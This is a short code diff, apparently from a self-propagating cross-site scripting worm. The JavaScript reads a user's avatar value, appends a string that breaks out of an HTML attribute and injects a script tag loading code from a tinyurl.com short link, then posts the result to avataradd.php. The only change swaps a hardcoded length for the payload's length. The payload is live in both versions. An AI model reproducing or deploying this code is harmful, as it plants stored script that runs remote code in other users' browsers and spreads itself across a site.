@@ -6,7 +6,7 @@ $.get('/avatar.php',(result)=>{
 		var toAdd = '"><script src="https://tinyurl.com/smuq7p4"></script></a><a "#';
 		res = [...aroundava.matchAll(/(img src=\"|\')([^\'\"]*)([^>]*)/g)];
 		if(res[0]){
-			if(res[0][2] && res[0][2].length + 63 <= 100){
+			if(res[0][2] && res[0][2].length + toAdd.length <= 100){
 				$.post( "avataradd.php", { fileavatar: res[0][2] + toAdd })
 			}
 		}else{
